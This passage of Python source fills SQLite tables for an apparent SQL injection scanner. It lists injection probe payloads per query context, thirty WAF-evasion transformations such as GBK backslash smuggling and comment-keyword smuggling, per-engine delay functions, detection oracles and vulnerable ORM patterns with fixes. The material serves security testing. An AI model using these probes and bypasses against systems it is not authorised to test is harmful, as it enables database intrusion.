        ("CTX_SELECT_EXPR", "select_expr", "SELECT Projection Expression List", "DQL", "UNQUOTED", "Comma separated expression", r"SELECT\s+.*FROM", ", (CASE WHEN 1=1 THEN 1 ELSE 2 END) AS col", ", (SELECT 1/0) AS err", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_JOIN_ON", "join_clause", "JOIN ... ON Clause Predicate", "DQL", "UNQUOTED", "Boolean conjunction on relation", r"JOIN\s+.*ON\s+|USING\s*\(", "ON 1=1 AND (CASE WHEN 1=1 THEN 1 ELSE 2 END)=1", "ON 1=1 AND (SELECT 1/0)=1", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_CASE_EXPR", "case_expr", "CASE WHEN Conditional Branch", "DQL", "UNQUOTED", "WHEN condition expression", r"CASE\s+WHEN|THEN\s+.*ELSE", "WHEN 1=1 THEN 1 ELSE 2 END", "WHEN 1=1 THEN 1/0 ELSE 1 END", "Low", "Medium", "REGRESSION_TESTED", "PASS"),
        ("CTX_WINDOW_FUNC", "window_func", "Window OVER (PARTITION BY ...)", "DQL", "PARENTHESIZED", "Window specification partition", r"OVER\s*\(PARTITION\s+BY", "OVER (PARTITION BY (CASE WHEN 1=1 THEN 1 ELSE 2 END))", "OVER (PARTITION BY (SELECT 1/0))", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_CTE_CLAUSE", "cte_clause", "Common Table Expression (WITH ...)", "DQL", "PARENTHESIZED", "CTE query body", r"WITH\s+[a-zA-Z0-9_]+\s+AS\s*\(", "WITH cte AS (SELECT 1 WHERE 1=1) SELECT * FROM cte", "WITH cte AS (SELECT 1/0) SELECT * FROM cte", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_FULLTEXT", "fulltext_search", "Full-Text Search (MATCH ... AGAINST)", "DQL", "SINGLE_QUOTE", "Search string quotes", r"MATCH\s*\(.*\)AGAINST|to_tsvector", "+test*' IN BOOLEAN MODE", "' AND (SELECT 1/0)='", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_SPATIAL_OP", "spatial_op", "Spatial / GIS Function (ST_Contains)", "DQL", "CONTEXT_DEPENDENT", "Geometry function parameters", r"ST_Contains|ST_Distance", "ST_Distance(geom, geom) >= 0", "ST_Distance(geom, (SELECT 1/0))", "Low", "Low", "REGRESSION_TESTED", "PASS"),
        ("CTX_BOOL_LITERAL", "boolean_literal", "Boolean Literal Context (TRUE/FALSE)", "DQL", "UNQUOTED", "Boolean truth toggle", r"true|false|1|0", "AND TRUE vs AND FALSE", "AND (1/0=1)", "Low", "Low", "REGRESSION_TESTED", "PASS"),
    ]
    cur.executemany("INSERT INTO syntactic_contexts VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", contexts)

    # 6. Parameter Types
    param_types = [
        ("string", "String Literal", r".*", "Standard alphanumeric or text string", json.dumps([]), json.dumps(["boolean", "error", "time", "union", "stacked"]), "REGRESSION_TESTED"),
        ("integer", "Integer Literal", r"^-?\d+$", "Signed 32/64-bit integer", json.dumps(["union"]), json.dumps(["boolean", "error", "time", "stacked"]), "REGRESSION_TESTED"),
        ("decimal", "Floating Point / Decimal", r"^-?\d+\.\d+$", "Floating point decimal number", json.dumps(["union", "stacked"]), json.dumps(["boolean", "error", "time"]), "REGRESSION_TESTED"),
        ("boolean", "Boolean Flag", r"^(true|false|0|1)$", "Boolean boolean truth value", json.dumps(["union", "stacked"]), json.dumps(["boolean", "time"]), "REGRESSION_TESTED"),
        ("date", "Calendar Date", r"^\d{4}-\d{2}-\d{2}$", "ISO-8601 calendar date YYYY-MM-DD", json.dumps(["union"]), json.dumps(["boolean", "time", "error"]), "REGRESSION_TESTED"),
        ("timestamp", "Timestamp / DateTime", r"^\d{4}-\d{2}-\d{2}[T\s]\d{2}:\d{2}:\d{2}", "ISO-8601 timestamp with optional timezone", json.dumps(["union"]), json.dumps(["boolean", "time", "error"]), "REGRESSION_TESTED"),
        ("uuid", "UUID / GUID", r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$", "Canonical RFC 4122 UUID", json.dumps(["union"]), json.dumps(["boolean", "error", "time"]), "REGRESSION_TESTED"),
        ("binary", "Binary / Hex String", r"^(0x[0-9a-fA-F]+|[0-9a-fA-F]{16,})$", "Hexadecimal or Base64 encoded binary bytes", json.dumps(["union"]), json.dumps(["boolean", "error"]), "REGRESSION_TESTED"),
        ("array", "Array / Collection", r"^(\[.*\]|\{.*\}|[^,]+(,[^,]+)+)$", "JSON array or CSV delimited list", json.dumps([]), json.dumps(["boolean", "error", "union"]), "REGRESSION_TESTED"),
        ("json", "JSON Document / Object", r"^\{.*\}$", "Structured JSON object payload", json.dumps([]), json.dumps(["boolean", "error", "modern"]), "REGRESSION_TESTED"),
        ("xml", "XML Document", r"^<.*>.*<\/.*>$", "Structured XML markup document", json.dumps([]), json.dumps(["boolean", "error", "modern"]), "REGRESSION_TESTED"),
        ("spatial", "Spatial Geometry WKT", r"^(POINT|POLYGON|LINESTRING)\(.*\)$", "Well-Known Text (WKT) geographic geometry", json.dumps(["union"]), json.dumps(["boolean", "error"]), "REGRESSION_TESTED"),
        ("vector", "Vector Embedding Array", r"^\[\s*-?\d+(\.\d+)?(\s*,\s*-?\d+(\.\d+)?)*\s*\]$", "Float vector array for vector search", json.dumps(["union"]), json.dumps(["boolean", "error"]), "REGRESSION_TESTED"),
        ("enum", "Enumerated Value", r"^[a-zA-Z0-9_\-]+$", "Restricted discrete set value (asc, desc, active)", json.dumps(["union", "stacked"]), json.dumps(["boolean", "error"]), "REGRESSION_TESTED"),
        ("identifier", "SQL Identifier", r"^[a-zA-Z_][a-zA-Z0-9_]*$", "Dynamic table, column, or alias name", json.dumps(["union"]), json.dumps(["boolean", "error"]), "REGRESSION_TESTED"),
        ("encoded", "URL / Base64 Encoded", r"^(%[0-9a-fA-F]{2})+|[A-Za-z0-9+/=]{8,}$", "Multi-layer encoded token", json.dumps([]), json.dumps(["boolean", "error", "time", "union"]), "REGRESSION_TESTED"),
        ("null", "Null / Missing Value", r"^(null|nil|undefined|)$", "Null or empty parameter", json.dumps(["stacked"]), json.dumps(["boolean", "error"]), "REGRESSION_TESTED"),
    ]
    cur.executemany("INSERT INTO parameter_types VALUES (?, ?, ?, ?, ?, ?, ?)", param_types)

    # 7. Transports
    transports = [
        ("query", "URL Query Parameter", "application/x-www-form-urlencoded", "RFC 3986 URL encoding (%20, +)", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("body_form", "Form URL-Encoded Body", "application/x-www-form-urlencoded", "Standard form encoding", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("body_multipart", "Multipart Form-Data", "multipart/form-data", "MIME boundary delimiter formatting", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("body_json", "JSON Document Body", "application/json", "JSON string escaping (\\\", \\\\)", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("body_xml", "XML Document Body", "application/xml", "XML entity encoding (&quot;, &#x27;)", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("header", "HTTP Request Header", "text/plain", "RFC 7230 header token rules", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("cookie", "Cookie Header Parameter", "text/plain", "Cookie key=value string format", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("path", "REST URL Path Segment", "text/plain", "URL path segment encoding", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
        ("graphql", "GraphQL Variable / Query", "application/json", "JSON variable object or query string", "FULLY_REACHABLE", "Supported via RequestParser.injectPayload"),
    ]
    cur.executemany("INSERT INTO transports VALUES (?, ?, ?, ?, ?, ?)", transports)

    # 8. DBMS Families
    dbms_families = [
        ("FAM_POSTGRES", "PostgreSQL Family", "PostgreSQL", "Relational engine with extensive extension support (pgvector, TimescaleDB, CockroachDB, YugabyteDB, AlloyDB, Redshift)."),
        ("FAM_MYSQL", "MySQL Family", "MySQL", "Relational engine with pluggable storage engines (MariaDB, SingleStore, Apache Doris, Vitess)."),
        ("FAM_MSSQL", "Microsoft SQL Server Family", "Sybase / T-SQL", "Enterprise relational and analytical engine (SQL Server, Azure Synapse)."),
        ("FAM_ORACLE", "Oracle Family", "Oracle", "Enterprise multi-model database engine with PL/SQL procedural runtime."),
        ("FAM_SQLITE", "SQLite Family", "SQLite", "Embedded, in-process, zero-configuration SQL database engine."),
        ("FAM_ENTERPRISE", "Classical Enterprise Relational", "ANSI SQL", "Enterprise relational engines (IBM Db2, SAP HANA, Teradata, Firebird)."),
        ("FAM_EMBEDDED_JAVA", "Embedded Java Relational", "ANSI SQL", "Java-based embedded relational engines (H2, HSQLDB)."),
        ("FAM_WAREHOUSE", "Cloud Data Warehouse / OLAP", "Distributed MPP", "Massively parallel processing analytical systems (Snowflake, BigQuery, ClickHouse, Vertica, Databricks)."),
        ("FAM_QUERY_ENGINE", "Distributed Query Engines", "Presto / ANSI", "Distributed SQL query engines over data lakes (Trino, Presto, DuckDB)."),
    ]
    cur.executemany("INSERT INTO dbms_families VALUES (?, ?, ?, ?)", dbms_families)

    # 9. DBMS Engines (All 38 Engines with Lineage)
    engines = [
        ("ENG_POSTGRES", "PostgreSQL", "FAM_POSTGRES", "PostgreSQL Global Development Group", "PostgreSQL", "PL/pgSQL", 1, None, "Multi-version concurrency, rich extensions"),
        ("ENG_MYSQL", "MySQL", "FAM_MYSQL", "Oracle Corporation", "MySQL", "MySQL Stored Procs", 1, None, "Thread-per-connection or thread-pool, flexible types"),
        ("ENG_MARIADB", "MariaDB", "FAM_MYSQL", "MariaDB Foundation", "MariaDB / MySQL", "MariaDB Stored Procs", 0, "ENG_MYSQL", "MySQL fork with sequence tables and spider engine"),
        ("ENG_MSSQL", "Microsoft SQL Server", "FAM_MSSQL", "Microsoft Corporation", "T-SQL", "T-SQL", 1, None, "Stacked query native support, WAITFOR delay"),
        ("ENG_ORACLE", "Oracle", "FAM_ORACLE", "Oracle Corporation", "Oracle SQL", "PL/SQL", 1, None, "Dual table required, ROWNUM limiting, DBMS_PIPE delay"),
        ("ENG_SQLITE", "SQLite", "FAM_SQLITE", "D. Richard Hipp", "SQLite SQL", "None", 1, None, "Dynamic manifest typing, in-process execution"),
        ("ENG_DB2", "IBM Db2", "FAM_ENTERPRISE", "IBM Corporation", "Db2 SQL", "SQL PL", 1, None, "sysibm.sysdummy1, syscat catalog"),
        ("ENG_H2", "H2", "FAM_EMBEDDED_JAVA", "H2 Group", "H2 SQL", "Java Runtime", 1, None, "Embedded Java runtime, Thread.sleep execution"),
        ("ENG_ACCESS", "Microsoft Access", "FAM_ENTERPRISE", "Microsoft Corporation", "Access SQL", "VBA", 1, None, "MSysObjects catalog, Cartesian CPU delay"),
        ("ENG_SNOWFLAKE", "Snowflake", "FAM_WAREHOUSE", "Snowflake Inc.", "Snowflake SQL", "JavaScript / Python UDF", 1, None, "SYSTEM$WAIT(s), separation of compute and storage"),
        ("ENG_BIGQUERY", "Google BigQuery", "FAM_WAREHOUSE", "Google Cloud", "GoogleSQL", "JavaScript UDF", 1, None, "UNNEST(GENERATE_ARRAY) computational delay"),
        ("ENG_CLICKHOUSE", "ClickHouse", "FAM_WAREHOUSE", "ClickHouse Inc.", "ClickHouse SQL", "C++ / Vectorized", 1, None, "Vectorized columnar execution, native sleep()"),
        ("ENG_COCKROACH", "CockroachDB", "FAM_POSTGRES", "Cockroach Labs", "PostgreSQL Compatible", "None", 0, "ENG_POSTGRES", "Distributed SQL with Raft consensus, PG wire"),
        ("ENG_REDSHIFT", "Amazon Redshift", "FAM_POSTGRES", "Amazon Web Services", "PostgreSQL Derivative (ParAccel)", "PL/pgSQL", 0, "ENG_POSTGRES", "Columnar MPP, no pg_sleep, join delay required"),
        ("ENG_DUCKDB", "DuckDB", "FAM_QUERY_ENGINE", "DuckDB Labs", "DuckDB SQL (Postgres compatible)", "C++ Embedded", 1, None, "In-process analytical OLAP, range() computational delay"),
        ("ENG_TRINO", "Trino", "FAM_QUERY_ENGINE", "Trino Software Foundation", "Trino SQL (ANSI)", "None", 1, None, "Distributed query engine, fail() error, sequence delay"),
        ("ENG_PRESTO", "Presto", "FAM_QUERY_ENGINE", "Linux Foundation (Presto)", "Presto SQL", "None", 0, "ENG_TRINO", "Trino/Presto lineage compatibility"),
        ("ENG_VERTICA", "Vertica", "FAM_WAREHOUSE", "OpenText / Micro Focus", "Vertica SQL", "C++ UDF", 1, None, "Columnar analytical warehouse, native SLEEP(s)"),
        ("ENG_HANA", "SAP HANA", "FAM_ENTERPRISE", "SAP SE", "HANA SQL", "SQLScript", 1, None, "In-memory column store, SLEEP_SECONDS, DUMMY"),
        ("ENG_TERADATA", "Teradata", "FAM_ENTERPRISE", "Teradata Corporation", "Teradata SQL", "SPL", 1, None, "QUALIFY ROW_NUMBER(), DBC.DBCInfo, TOP limit"),
        ("ENG_FIREBIRD", "Firebird", "FAM_ENTERPRISE", "Firebird Project", "Firebird SQL", "PSQL", 1, None, "RDB$DATABASE, FIRST/SKIP limit, SUBSTRING..FROM..FOR"),
        ("ENG_DATABRICKS", "Databricks SQL", "FAM_WAREHOUSE", "Databricks Inc.", "Spark SQL / ANSI", "Python / Scala UDF", 1, None, "ASSERT_TRUE runtime error, RANGE unnest delay"),
        ("ENG_SYNAPSE", "Azure Synapse", "FAM_MSSQL", "Microsoft Corporation", "T-SQL (Distributed)", "T-SQL", 0, "ENG_MSSQL", "Distributed SQL pool, sys.tables, OFFSET/FETCH"),
        ("ENG_DORIS", "Apache Doris", "FAM_MYSQL", "Apache Software Foundation", "MySQL Compatible", "None", 0, "ENG_MYSQL", "MPP analytical database, sleep(s), MySQL wire"),
        ("ENG_SINGLESTORE", "SingleStore", "FAM_MYSQL", "SingleStore Inc.", "MySQL Compatible", "MPSQL", 0, "ENG_MYSQL", "Distributed relational memory engine, SLEEP(s)"),
        ("ENG_VITESS", "Vitess", "FAM_MYSQL", "PlanetScale / CNCF", "MySQL Compatible", "None", 0, "ENG_MYSQL", "Sharded MySQL middleware with query plan hints"),
        ("ENG_TIMESCALE", "TimescaleDB", "FAM_POSTGRES", "Timescale Inc.", "PostgreSQL Compatible", "PL/pgSQL", 0, "ENG_POSTGRES", "Time-series extension over PostgreSQL"),
        ("ENG_YUGABYTE", "YugabyteDB", "FAM_POSTGRES", "Yugabyte Inc.", "PostgreSQL Compatible", "PL/pgSQL", 0, "ENG_POSTGRES", "Distributed SQL with DocDB storage, PG wire"),
        ("ENG_ALLOYDB", "AlloyDB", "FAM_POSTGRES", "Google Cloud", "PostgreSQL Compatible", "PL/pgSQL", 0, "ENG_POSTGRES", "Google managed PostgreSQL engine"),
        ("ENG_GENERIC", "Generic SQL", "FAM_ENTERPRISE", "ANSI / ISO", "ANSI SQL:1999/2003", "None", 1, None, "Conservative ANSI SQL fallback baseline"),
    ]
    cur.executemany("INSERT INTO dbms_engines VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", engines)

    # 10. Detection Oracles
    oracles = [
        ("ORC_STATUS", "HTTP Status Code Divergence", "Status Code", "Exact Integer Matching", 95.0, 1, "Status code must not fluctuate on baseline", "False negatives if server catches 500 into 200"),
        ("ORC_CONTENT", "Response Content Diffing", "Response Body", "DOM Structural & Token Diffing", 90.0, 2, "Dynamic content masking (timestamps, nonces)", "False negatives on subtle 1-character changes"),
        ("ORC_ERROR", "Database Error Signature Match", "Regex Matching", "Engine Error Pattern Matching", 95.0, 1, "Error signature regexes strictly anchored", "Custom error suppression middleware"),
        ("ORC_SPRT_TIMING", "Wald SPRT Latency Discrimination", "Response Latency", "Sequential Probability Ratio Test", 98.0, 5, "Alpha=0.01 Type I error bound, eliminates jitter", "Server timeout or aggressive connection drop"),
        ("ORC_TLP_METAMORPHIC", "USENIX 2020 Ternary Logic Partitioning", "Relational Invariant", "Partition Cardinality Equality Q(P)+Q(!P)+Q(P IS NULL)==Q(TRUE)", 99.0, 3, "Verifies 3-way partition identity to eliminate FP", "Non-deterministic sorting order"),
        ("ORC_OAST", "Out-of-Band Collaborator Callback", "DNS/HTTP Socket", "Cryptographic Token Nonce Correlation", 99.9, 1, "Stateless AES-256 token validation", "Egress firewall filtering outbound DNS"),
    ]
    cur.executemany("INSERT INTO detection_oracles VALUES (?, ?, ?, ?, ?, ?, ?, ?)", oracles)

    # 11. WAF Transformations (E01–E30)
    waf_transforms = [
        ("E01", "Inline Comment Whitespace Replacement", "Comment", "Replaces standard spaces with /**/ inline comments", 1, json.dumps(["MySQL", "PostgreSQL", "SQLite", "Microsoft SQL Server"])),
        ("E02", "Newline Comment Separation", "Comment", "Replaces spaces with newline-prefixed comment blocks", 1, json.dumps(["PostgreSQL", "Trino", "Presto"])),
        ("E03", "URL Multi-Encoding", "Encoding", "Applies double URL encoding (%2527)", 1, json.dumps(["ALL"])),
        ("E04", "HTML Entity Encoding", "Encoding", "Encodes quotes and characters as &#x27; or &apos;", 1, json.dumps(["XML", "HTML"])),
        ("E05", "Multibyte GBK Smuggling", "Encoding", "Prepends 0xbf to consume backslash sanitization", 1, json.dumps(["MySQL", "PostgreSQL"])),
        ("E06", "MySQL Version Comment Smuggling", "Comment", "Wraps keywords inside /*!50000SELECT*/", 1, json.dumps(["MySQL", "MariaDB", "SingleStore", "Vitess"])),
        ("E07", "Scientific Notation Numeric Literal", "Literal", "Represents integers as float exponentials (1e0)", 1, json.dumps(["ALL"])),
        ("E08", "Hexadecimal String Literal", "Literal", "Represents strings in hex 0x7573657273", 1, json.dumps(["MySQL", "SQLite", "MSSQL"])),
        ("E09", "Parentheses Boundary Replacement", "Syntax", "Replaces spaces with parenthesis boundaries (SELECT(username)FROM(users))", 1, json.dumps(["ALL"])),
        ("E10", "Case Alternation Randomization", "Case", "Randomizes keyword casing (sElEcT, uNiOn)", 1, json.dumps(["ALL"])),
        ("E11", "Concat Splitting with Quoted Strings", "String", "Splits keywords into concatenated chunks ('SEL'||'ECT')", 1, json.dumps(["Oracle", "PostgreSQL", "SQLite"])),
        ("E12", "Between Operator Equivalence", "Operator", "Replaces = with BETWEEN X AND X", 1, json.dumps(["ALL"])),
        ("E13", "Like Operator Equivalence", "Operator", "Replaces = with LIKE operator", 1, json.dumps(["ALL"])),
        ("E14", "Greatest/Least Function Equivalence", "Function", "Replaces > and < with GREATEST() or LEAST()", 1, json.dumps(["MySQL", "PostgreSQL"])),
        ("E15", "Null-Byte String Truncation", "Encoding", "Injects %00 to terminate legacy string parsers", 1, json.dumps(["PHP/MySQL Legacy"])),
        ("E16", "Unicode Full-Width Character Smuggling", "Encoding", "Replaces ASCII quotes with Unicode fullwidth ％２７", 1, json.dumps(["IIS / ASP.NET"])),
        ("E17", "Backtick Identifier Quoting", "Syntax", "Wraps table and column identifiers in backticks", 1, json.dumps(["MySQL", "MariaDB"])),
        ("E18", "Square Bracket Identifier Quoting", "Syntax", "Wraps identifiers in brackets ([users].[id])", 1, json.dumps(["Microsoft SQL Server", "MS Access"])),
        ("E19", "T-SQL Plus Operator String Concat", "Operator", "Concatenates strings using T-SQL + operator", 1, json.dumps(["Microsoft SQL Server"])),
        ("E20", "ANSI Double Pipe String Concat", "Operator", "Concatenates strings using || operator", 1, json.dumps(["PostgreSQL", "Oracle", "SQLite"])),
        ("E21", "MySQL Space Concatenation", "Operator", "Concatenates literals using space separation", 1, json.dumps(["MySQL"])),
        ("E22", "Bitwise Inversion True Literal (~0)", "Literal", "Generates maximum integer via bitwise NOT (~0)", 1, json.dumps(["MySQL", "MSSQL"])),
        ("E23", "Boolean True Invariant (1=1)", "Predicate", "Evaluates tautological numeric equality", 1, json.dumps(["ALL"])),
        ("E24", "Boolean False Invariant (1=2)", "Predicate", "Evaluates contradiction numeric inequality", 1, json.dumps(["ALL"])),
        ("E25", "String Equality Invariant ('a'='a')", "Predicate", "Evaluates string identity tautology", 1, json.dumps(["ALL"])),
        ("E26", "Divide By Zero Arithmetic Error", "Error", "Forces runtime divide-by-zero 1/0 exception", 1, json.dumps(["PostgreSQL", "MSSQL", "Oracle", "DuckDB"])),
        ("E27", "EXP(710) Numeric Overflow Error", "Error", "Forces double precision overflow in MySQL EXP(710)", 1, json.dumps(["MySQL", "MariaDB"])),
        ("E28", "CHR/CHAR Dynamic String Construction", "Function", "Constructs strings dynamically via CHAR(97,100,109,105,110)", 1, json.dumps(["ALL"])),
        ("E29", "Unicode Normalization Form C/D", "Encoding", "Uses decomposed Unicode characters that combine upon UTF-8 normalization", 1, json.dumps(["Java / Node.js Backends"])),
        ("E30", "XML CDATA Section Breakout", "Encoding", "Breaks out of XML markup using ]]> delimiters", 1, json.dumps(["SOAP / XML APIs"])),
    ]
    cur.executemany("INSERT INTO waf_transformations VALUES (?, ?, ?, ?, ?, ?)", waf_transforms)

    # 12. Research References
    references = [
        ("REF_HALFOND_2006", "Command Injection Detection in Web Applications", "Halfond & Orso", 2006, "Academic Paper", "ACM SIGSOFT", "Boolean Differential Invariants", "IMPLEMENTED"),
        ("REF_WALD_1945", "Sequential Tests of Statistical Hypotheses", "Abraham Wald", 1945, "Academic Paper", "Annals of Mathematical Statistics", "Sequential Probability Ratio Test (SPRT)", "IMPLEMENTED"),
        ("REF_RIGGER_2020", "Testing Database Systems via Ternary Logic Partitioning", "Manuel Rigger & Zhendong Su", 2020, "Academic Paper", "USENIX Security 2020", "Metamorphic TLP Partitioning (Q(P) U Q(!P) U Q(NULL) == Q(TRUE))", "IMPLEMENTED"),
        ("REF_PORTSWIGGER_SQLI", "SQL Injection Learning & Vulnerability Labs", "PortSwigger Web Security Academy", 2023, "PortSwigger", "https://portswigger.net/web-security/sql-injection", "Labs 01-14: In-Band, Blind, Error, Time, OAST", "IMPLEMENTED"),
        ("REF_SHIFLETT_GBK", "Addslashes Versus Charset Encoding", "Chris Shiflett", 2006, "Research Advisory", "https://shiflett.org/", "GBK Multibyte Backslash Smuggling (%bf%27)", "IMPLEMENTED"),
        ("REF_CVE_2023_34362", "Progress MOVEit Transfer SQL Injection", "Progress Software / Mandiant", 2023, "CVE", "CVE-2023-34362", "HTTP Header SQL Injection to Session Hijacking", "IMPLEMENTED"),
        ("REF_CVE_2023_48795", "Terrapin Attack: Break Integrity of SSH / Wire", "Bock et al.", 2023, "CVE", "CVE-2023-48795", "Wire Protocol Downgrades", "OUT_OF_SCOPE"),
        ("REF_PGVECTOR_SPEC", "pgvector: Open-Source Vector Similarity Search for Postgres", "Andrew Kane", 2024, "Vendor Advisory", "https://github.com/pgvector/pgvector", "Distance Operators (<->, <=>, <#>) and Index Invariants", "IMPLEMENTED"),
        ("REF_PRISMA_UNSAFE", "Prisma $queryRawUnsafe Vulnerability Patterns", "Prisma Engineering", 2022, "Vendor Advisory", "https://www.prisma.io/docs", "Template Tag vs String Interpolation SQLi", "IMPLEMENTED"),
        ("REF_HIBERNATE_HQL", "Hibernate HQL Injection in Dynamic Queries", "Red Hat", 2021, "Vendor Advisory", "https://hibernate.org", "Entity Property Path Traversal and HQL Breakouts", "IMPLEMENTED"),
    ]
    cur.executemany("INSERT INTO research_references VALUES (?, ?, ?, ?, ?, ?, ?, ?)", references)

    # 13. ORM Frameworks
    orms = [
        ("ORM_HIBERNATE", "Hibernate / JPA", "Java", json.dumps(["session.createQuery(\"FROM User WHERE name = '\" + input + \"'\")", "createNativeQuery(rawSql)"]), "Use named parameters (:paramName) or JPA Criteria API with typed Path bindings."),
        ("ORM_PRISMA", "Prisma ORM", "TypeScript", json.dumps(["prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = ${input}`)", "raw SQL template string without tagged template"]), "Use prisma.$queryRaw`SELECT * FROM users WHERE id = ${input}` tagged template."),
        ("ORM_TYPEORM", "TypeORM", "TypeScript", json.dumps(["createQueryBuilder().where(`user.name = '${input}'`)", "query(rawSql)"]), "Use parameterized object syntax: where(\"user.name = :name\", { name: input })."),
        ("ORM_SEQUELIZE", "Sequelize", "JavaScript", json.dumps(["sequelize.query(`SELECT * FROM users WHERE id = ${input}`)", "where: { col: sequelize.literal(rawInput) }"]), "Use replacements or bind options in sequelize.query(), avoid sequelize.literal on user input."),
        ("ORM_DJANGO", "Django ORM", "Python", json.dumps(["User.objects.raw(\"SELECT * FROM users WHERE name = '\" + input + \"'\")", "extra(where=[\"name = '\" + input + \"'\"])"]), "Use params argument in raw(): User.objects.raw(sql, [input]), avoid extra()."),
        ("ORM_SQLALCHEMY", "SQLAlchemy", "Python", json.dumps(["session.execute(text(f\"SELECT * FROM users WHERE id = {input}\"))", "select().where(literal_column(input))"]), "Use bound parameters: text(\"SELECT * FROM users WHERE id = :id\").params(id=input)."),
        ("ORM_EFCORE", "Entity Framework Core", "C# / .NET", json.dumps(["context.Users.FromSqlRaw(\"SELECT * FROM Users WHERE Name = '\" + input + \"'\")", "ExecuteSqlRaw(rawSql)"]), "Use FromSqlInterpolated with string interpolation, which automatically generates DbParameters."),
    ]
    cur.executemany("INSERT INTO orm_frameworks VALUES (?, ?, ?, ?, ?)", orms)

    # 14. Application Surfaces
    surfaces = [
        ("SURF_QUERY_PARAM", "URL Query Parameter", "Parameters in URL query string (?id=1&sort=asc)", "Passed into dynamic SQL WHERE or ORDER BY clauses.", "DIRECT_HTTP"),
        ("SURF_PATH_PARAM", "REST URL Path Segment", "Path segment parameters (/api/users/123/profile)", "Extracted by routing middleware and passed into lookup queries.", "DIRECT_HTTP"),
        ("SURF_FORM_BODY", "Form URL-Encoded Body", "POST parameters in application/x-www-form-urlencoded body", "Commonly used in login, search, and update forms.", "DIRECT_HTTP"),
        ("SURF_JSON_BODY", "JSON REST Body", "Fields inside JSON payloads (POST/PUT/PATCH)", "Mapped into ORM entities or raw SQL statements.", "DIRECT_HTTP"),
        ("SURF_XML_BODY", "XML / SOAP Document Body", "XML element values and attributes in SOAP or REST payloads", "Parsed into XMLType, XPath, or dynamic SQL queries.", "DIRECT_HTTP"),
        ("SURF_MULTIPART", "Multipart Form Data", "Form fields and filename parameters in multipart uploads", "Filename and metadata stored via INSERT queries.", "DIRECT_HTTP"),
        ("SURF_HEADERS", "HTTP Request Headers", "Headers such as X-Forwarded-For, User-Agent, Referer", "Frequently recorded into access logs or audit tables via INSERT.", "DIRECT_HTTP"),
        ("SURF_COOKIES", "HTTP Cookie Header", "Session tokens, tracking IDs, preferences in Cookie header", "Looked up via SELECT session queries.", "DIRECT_HTTP"),
        ("SURF_GRAPHQL_VAR", "GraphQL Variable / Directive", "Variables in GraphQL POST bodies or custom directives", "Compiled into SQL via DataLoader or Prisma/Hasura.", "DIRECT_HTTP"),
        ("SURF_FILE_IMPORT", "File Import Workflow", "CSV, TSV, or spreadsheet row data imported via batch jobs", "Inserted via COPY, LOAD DATA, or batch INSERT statements.", "REQUIRES_WORKFLOW"),
        ("SURF_REPORTING", "Analytical Reporting Interface", "Dynamic column selectors and groupers in admin reporting panels", "Directly concatenated into SELECT, GROUP BY, and ORDER BY.", "DIRECT_HTTP"),
        ("SURF_ASYNC_QUEUE", "Asynchronous Task Worker", "Data passed through background queues (RabbitMQ, Kafka, Celery)", "Executed asynchronously in downstream cron or worker SQL sinks.", "INDIRECT_ASYNC"),
        ("SURF_WEBHOOK", "Inbound Webhook Endpoint", "Callbacks from external payment or notification gateways", "Stored via state-updating UPDATE/INSERT queries.", "DIRECT_HTTP"),
        ("SURF_WEBSOCKET", "WebSocket Message Stream", "Real-time message payloads sent across established WebSocket pipes", "Processed by real-time subscription or persistence queries.", "DIRECT_HTTP"),
        ("SURF_RPC_BINARY", "Binary RPC Protocol (gRPC/Thrift)", "Protobuf or Thrift binary messages over HTTP/2", "Deserialized into server-side business logic and database queries.", "OUT_OF_SCOPE"),
    ]
    cur.executemany("INSERT INTO application_surfaces VALUES (?, ?, ?, ?, ?)", surfaces)

    # 15. DBMS Versions & Lineage Differences
    versions = [
        ("VER_PG_96", "ENG_POSTGRES", "PostgreSQL 9.6", 2016, "Traditional pg_sleep, no JSON_TABLE, standard cast", "pg_sleep(s)", "--", "CAST(.. AS int)"),
        ("VER_PG_12", "ENG_POSTGRES", "PostgreSQL 12", 2019, "Generated columns, CTE inlining control (WITH cte AS MATERIALIZED)", "pg_sleep(s)", "--", "CAST(.. AS int)"),
        ("VER_PG_14", "ENG_POSTGRES", "PostgreSQL 14", 2021, "Multirange types, subscripting for any data type, SEARCH/CYCLE in CTE", "pg_sleep(s)", "--", "CAST(.. AS int)"),
        ("VER_PG_16", "ENG_POSTGRES", "PostgreSQL 16", 2023, "pgvector 0.5+ support, JSON_ARRAYAGG, bidirectional logical replication", "pg_sleep(s)", "--", "CAST(.. AS int)"),
        ("VER_MYSQL_57", "ENG_MYSQL", "MySQL 5.7", 2015, "Native JSON type introduced, EXP(710) overflow error, sleep()", "sleep(s)", "#", "EXP(710)"),
        ("VER_MYSQL_80", "ENG_MYSQL", "MySQL 8.0", 2018, "CTE (WITH), Window functions (OVER), invisible indexes, RegExp functions", "sleep(s)", "#", "EXP(710) / 1/0"),
        ("VER_MYSQL_84", "ENG_MYSQL", "MySQL 8.4 LTS", 2024, "Deprecated mysql_native_password, vector extensions preview", "sleep(s)", "#", "1/0"),
        ("VER_MSSQL_2016", "ENG_MSSQL", "SQL Server 2016", 2016, "FOR XML PATH, STRING_AGG introduced in 2017, WAITFOR DELAY", "WAITFOR DELAY", "--", "1/0"),
        ("VER_MSSQL_2019", "ENG_MSSQL", "SQL Server 2019", 2019, "UTF-8 support, Accelerated Database Recovery, graph tables", "WAITFOR DELAY", "--", "1/0"),
